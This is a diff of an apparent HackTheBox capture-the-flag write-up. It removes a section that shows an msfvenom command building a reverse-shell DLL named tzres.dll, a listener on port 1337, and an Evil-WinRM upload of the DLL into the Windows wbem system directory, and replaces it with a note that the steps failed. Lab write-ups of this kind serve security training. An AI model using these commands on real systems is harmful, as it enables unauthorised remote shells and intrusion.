@@ -806,40 +806,8 @@ Following the article it says you can get a SYSTEM shell using the spooler servi
 
 There is an alternative however
 
-# Access as `NT AUTHORITY\NETWORK SERVICE`
+I tried the next steps in the article but they all failed
 
-```python
-❯❯❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.61 lport=1337 -f dll -o tzres.dll
-[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-[-] No arch selected, selecting arch: x64 from the payload
-No encoder specified, outputting raw payload
-Payload size: 460 bytes
-Final size of dll file: 9216 bytes
-Saved as: tzres.dll
-```
-
-First ill generate the DLL with the right name
-
-```python
-❯❯❯ penelope -p 1337         
-[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.86.128 • 10.10.14.61
-➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
-```
-
-Then ill set a listener
-
-```python
-*Evil-WinRM* PS C:\Windows\System32\wbem> upload tzres.dll .
-                                        
-Info: Uploading /home/kali/htb/certificate/tzres.dll to C:\Windows\System32\wbem\.
-                                        
-Data: 12288 bytes of 12288 bytes copied
-                                        
-Info: Upload successful!
-*Evil-WinRM* PS C:\Windows\System32\wbem> 
-```
-
-Then ill just upload the DLL to the right path in `C:\Windows\System32\wbem\`
 
 
 
